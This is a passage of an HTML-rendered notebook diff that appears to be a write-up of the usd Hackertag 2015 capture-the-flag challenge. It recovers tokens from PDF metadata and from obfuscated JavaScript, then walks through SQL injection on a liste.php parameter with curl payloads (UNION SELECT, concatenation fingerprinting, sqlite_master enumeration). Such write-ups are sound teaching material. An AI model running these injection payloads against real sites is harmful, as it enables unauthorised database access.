+&lt;p&gt;&lt;img src="http://dl.dornea.nu/img/2015/hackertag/c304c9040deae8ee416f3e4f8a8f7802.png" alt="hackertag"&gt;&lt;/p&gt;
+&lt;p&gt;Let&amp;#39;s extract all available strings:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[13]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;strings usd_Hackertag_2015.pdf | tail -n 20
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;/ModDate (D:20150220100358+01&amp;apos;00&amp;apos;)
+/Producer (Adobe PDF library 10.01)
+/Title (usd Hackertag 2015)
+/Trapped /False
+/Subject (Token: 338912)
+endobj
+xref
+0000000000 65535 f
+0000608444 00000 n
+0000651051 00000 n
+trailer
+/Size 44
+/Root 6 0 R
+/Info 4 0 R
+/ID [ &amp;lt;B86554FD3FAA6D459E2C0B3D46980BDB&amp;gt; &amp;lt;f302C8F15AC3244B86122640F6B03D76&amp;gt; ]
+/Prev 116
+%EndExifToolUpdate 608422
+startxref
+651378
+%%EOF
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Again bingo: &lt;strong&gt;Token: 338912&lt;/strong&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;h2 id="4th-Token"&gt;4th Token&lt;a class="anchor-link" href="#4th-Token"&gt;&amp;#182;&lt;/a&gt;&lt;/h2&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Now let&amp;#39;s have a look at the main &lt;a href="http://82.195.79.41/"&gt;web-page&lt;/a&gt;. Somewhere you&amp;#39;ll see this line:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;script type=&amp;quot;text/javascript&amp;quot; src=&amp;quot;http://82.195.79.41/js/jquery/jquery.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But wait a sec. JQuery? That sounds suspicious.&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[17]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl http://82.195.79.41/js/jquery/jquery.js
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;eval(String.fromCharCode(105, 102, 32, 40, 119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 46, 104, 111, 115, 116, 110, 97, 109, 101, 32, 61, 61, 32, 34, 49, 50, 55, 46, 48, 46, 48, 46, 49, 34, 41, 32, 123, 10, 118, 97, 114, 32, 95, 48, 120, 98, 55, 57, 97, 61, 91, 34, 92, 120, 53, 55, 92, 120, 54, 57, 92, 120, 54, 67, 92, 120, 54, 67, 92, 120, 54, 66, 92, 120, 54, 70, 92, 120, 54, 68, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 50, 48, 92, 120, 55, 65, 92, 120, 55, 53, 92, 120, 55, 50, 92, 120, 70, 67, 92, 120, 54, 51, 92, 120, 54, 66, 92, 120, 50, 48, 92, 120, 54, 54, 92, 120, 55, 50, 92, 120, 54, 53, 92, 120, 54, 52, 92, 120, 54, 52, 92, 120, 55, 57, 92, 120, 50, 69, 92, 120, 50, 48, 92, 120, 52, 52, 92, 120, 54, 53, 92, 120, 55, 50, 92, 120, 50, 48, 92, 120, 54, 55, 92, 120, 54, 53, 92, 120, 54, 56, 92, 120, 54, 53, 92, 120, 54, 57, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 50, 48, 92, 120, 53, 52, 92, 120, 54, 70, 92, 120, 54, 66, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 50, 48, 92, 120, 54, 67, 92, 120, 54, 49, 92, 120, 55, 53, 92, 120, 55, 52, 92, 120, 54, 53, 92, 120, 55, 52, 92, 120, 51, 65, 92, 120, 50, 48, 92, 120, 51, 52, 92, 120, 51, 49, 92, 120, 51, 55, 92, 120, 51, 56, 92, 120, 51, 53, 92, 120, 51, 53, 34, 93, 59, 97, 108, 101, 114, 116, 40, 95, 48, 120, 98, 55, 57, 97, 91, 48, 93, 41, 59, 10, 125));
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[40]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="n"&gt;char_codes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="n"&gt;curl&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;82.195&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;79.41&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;js&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;jquery&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;jquery&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;js&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[41]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="c"&gt;# Convert char codes to string&lt;/span&gt;
+&lt;span class="n"&gt;char_codes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;char_codes&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;string_message&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;char_codes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;string_message&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt output_prompt"&gt;
+    Out[41]:&lt;/div&gt;
+
+
+&lt;pre class="ipynb"&gt;&amp;apos;if (window.location.hostname == &amp;quot;127.0.0.1&amp;quot;) {\nvar _0xb79a=[&amp;quot;\\x57\\x69\\x6C\\x6C\\x6B\\x6F\\x6D\\x6D\\x65\\x6E\\x20\\x7A\\x75\\x72\\xFC\\x63\\x6B\\x20\\x66\\x72\\x65\\x64\\x64\\x79\\x2E\\x20\\x44\\x65\\x72\\x20\\x67\\x65\\x68\\x65\\x69\\x6D\\x65\\x20\\x54\\x6F\\x6B\\x65\\x6E\\x20\\x6C\\x61\\x75\\x74\\x65\\x74\\x3A\\x20\\x34\\x31\\x37\\x38\\x35\\x35&amp;quot;];alert(_0xb79a[0]);\n}&amp;apos;&lt;/pre&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[64]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="c"&gt;# Decode hex string to ascii&lt;/span&gt;
+&lt;span class="n"&gt;hex_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;string_message&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;61&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s"&gt;x&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;binascii&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unhexlify&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hex_code&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt output_prompt"&gt;
+    Out[64]:&lt;/div&gt;
+
+
+&lt;pre class="ipynb"&gt;b&amp;apos;Willkommen zur\xfcck freddy. Der geheime Token lautet: 417855&amp;apos;&lt;/pre&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Our found token: &lt;strong&gt;417855&lt;/strong&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;h2 id="5th-Token"&gt;5th Token&lt;a class="anchor-link" href="#5th-Token"&gt;&amp;#182;&lt;/a&gt;&lt;/h2&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;I must say this part of the challenge was the most &amp;quot;challenging&amp;quot; one. The found vulnerability was actually obvious but it took me to long to exploit it :D But first a short introduction to the vulnerability itself.&lt;/p&gt;
+&lt;p&gt;There was this link &lt;a href="http://82.195.79.41/liste.php?id=1"&gt;http://82.195.79.41/liste.php?id=1&lt;/a&gt; which caught my attention from the beginning. &lt;/p&gt;
+&lt;p&gt;&lt;img src="http://dl.dornea.nu/img/2015/hackertag/0b0663206b0bb77ffcb484f606c39936.png" alt="hackertag"&gt;&lt;/p&gt;
+&lt;p&gt;The first thing I did:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[75]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://82.195.79.41/liste.php?id=1&amp;#39;&amp;quot;&lt;/span&gt; 2&amp;gt; /dev/null | tail -n 1
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;&amp;lt;div id=&amp;quot;contentliquid&amp;quot;&amp;gt;&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;unrecognized token: &amp;quot;&amp;apos;1&amp;apos;&amp;apos;;&amp;quot;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Aha.. Ok. Let&amp;#39;s try again:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[82]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://82.195.79.41/liste.php?id=1&amp;#39;%20OR 1=1&amp;quot;&lt;/span&gt; 2&amp;gt; /dev/null | tail -n 1
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;&amp;lt;div id=&amp;quot;contentliquid&amp;quot;&amp;gt;&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;unrecognized token: &amp;quot;&amp;apos;;&amp;quot;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;What about the next one?&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[89]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://82.195.79.41/liste.php?id=NULL&amp;#39;%20UNION%20ALL%20SELECT%20&amp;#39;a&amp;#39;,&amp;#39;k&amp;#39;;--#&amp;quot;&lt;/span&gt; 2&amp;gt; /dev/null | tail -n 20
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;&amp;lt;div id=&amp;quot;contentliquid&amp;quot;&amp;gt;&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;/liste.php?id=a&amp;quot;&amp;gt;k&amp;lt;/a&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
+        &amp;lt;div id=&amp;quot;leftcolumn&amp;quot;&amp;gt;
+	&amp;lt;ul&amp;gt;
+	&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;http://82.195.79.41/index.php&amp;quot;&amp;gt;Startseite&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+	&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;http://82.195.79.41/liste.php&amp;quot;&amp;gt;Todo-Liste&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+	&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;http://82.195.79.41/restricted/index.php&amp;quot;&amp;gt;Backend&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+	&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;http://82.195.79.41/download.php&amp;quot;&amp;gt;Downloads&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+	&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;http://www.usd.de/impressum/&amp;quot; target=&amp;quot;_blank&amp;quot;&amp;gt;Impressum&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+	&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;http://www.usd.de/datenschutz/&amp;quot; target=&amp;quot;_blank&amp;quot;&amp;gt;Datenschutz&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
+	&amp;lt;/ul&amp;gt;
+        &amp;lt;/div&amp;gt;
+
+        &amp;lt;div id=&amp;quot;footer&amp;quot;&amp;gt;
+            &amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;
+        &amp;lt;/div&amp;gt;
+    &amp;lt;/div&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+
+
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Have you noticed this line?&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;contentliquid&amp;quot;&amp;gt;&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;/liste.php?id=a&amp;quot;&amp;gt;k&amp;lt;/a&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;a&lt;/strong&gt; and &lt;strong&gt;b&lt;/strong&gt; were successfully &amp;quot;merged&amp;quot; into the results. Now the biggest problem I had was the fingerprinting of the DB itself. OWASP has &lt;a href="https://www.owasp.org/index.php/OWASP_Backend_Security_Project_DBMS_Fingerprint#Fingerprinting_through_SQL_Dialect_Injection"&gt;sth&lt;/a&gt; you can use in your tests. But the most useful thing is to test for &lt;em&gt;string concatenation&lt;/em&gt; (nice article &lt;a href="http://digitizor.com/2009/03/27/sql-injection-2-fingerprinting/"&gt;here&lt;/a&gt;). So I&amp;#39;ve tried several things:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[91]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://82.195.79.41/liste.php?id=NULL&amp;#39;%20UNION%20ALL%20SELECT%20CONCAT(&amp;#39;a&amp;#39;, &amp;#39;b&amp;#39;),&amp;#39;k&amp;#39;;--#&amp;quot;&lt;/span&gt; 2&amp;gt; /dev/null | grep &lt;span class="s2"&gt;&amp;quot;contentliquid&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;&amp;lt;div id=&amp;quot;contentliquid&amp;quot;&amp;gt;&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;unrecognized token: &amp;quot;&amp;apos;;&amp;quot;
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[93]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://82.195.79.41/liste.php?id=NULL&amp;#39;%20UNION%20ALL%20SELECT%20&amp;#39;a&amp;#39;+&amp;#39;b&amp;#39;,&amp;#39;k&amp;#39;;--#&amp;quot;&lt;/span&gt; 2&amp;gt; /dev/null | grep &lt;span class="s2"&gt;&amp;quot;contentliquid&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;&amp;lt;div id=&amp;quot;contentliquid&amp;quot;&amp;gt;&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;/liste.php?id=a&amp;quot;&amp;gt;k&amp;lt;/a&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[94]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://82.195.79.41/liste.php?id=NULL&amp;#39;%20UNION%20ALL%20SELECT%20&amp;#39;a&amp;#39;||&amp;#39;b&amp;#39;,&amp;#39;k&amp;#39;;--#&amp;quot;&lt;/span&gt; 2&amp;gt; /dev/null | grep &lt;span class="s2"&gt;&amp;quot;contentliquid&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
+&lt;pre class="ipynb"&gt;&amp;lt;div id=&amp;quot;contentliquid&amp;quot;&amp;gt;&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;li&amp;gt;&amp;lt;a href=&amp;quot;/liste.php?id=ab&amp;quot;&amp;gt;k&amp;lt;/a&amp;gt;&amp;lt;ul&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;
+&lt;/pre&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing text_cell rendered"&gt;
+&lt;div class="prompt input_prompt"&gt;
+&lt;/div&gt;
+&lt;div class="inner_cell"&gt;
+&lt;div class="text_cell_render border-box-sizing rendered_html"&gt;
+&lt;p&gt;Well &lt;code&gt;&amp;#39;a&amp;#39;||&amp;#39;b&amp;#39;&lt;/code&gt; seemed to work. That syntax is &lt;em&gt;Oracle&lt;/em&gt; specific. But also &lt;em&gt;SQLite&lt;/em&gt; specific. And this was my biggest mistake: I was searching for Oracle specific injections, but the DBMS was in fact SQLite. Finally I&amp;#39;ve constructed this query:&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="cell border-box-sizing code_cell rendered"&gt;
+&lt;div class="input"&gt;
+&lt;div class="prompt input_prompt"&gt;
+In&amp;nbsp;[99]:
+&lt;/div&gt;
+
+&lt;div class="input_area box-flex1"&gt;
+&lt;div class="highlight-ipynb"&gt;&lt;pre class="ipynb"&gt;&lt;span class="o"&gt;!&lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://82.195.79.41/liste.php?id=NULL&amp;#39;%20UNION%20ALL%20SELECT%20&amp;#39;a&amp;#39;,name%20FROM%20sqlite_master;--#&amp;quot;&lt;/span&gt; 2&amp;gt; /dev/null | grep &lt;span class="s2"&gt;&amp;quot;contentliquid&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;/div&gt;
+
+&lt;div class="output_wrapper"&gt;
+&lt;div class="output"&gt;
+
+
+&lt;div class="output_area"&gt;&lt;div class="prompt"&gt;&lt;/div&gt;
+&lt;div class="box-flex1 output_subarea output_stream output_stdout"&gt;
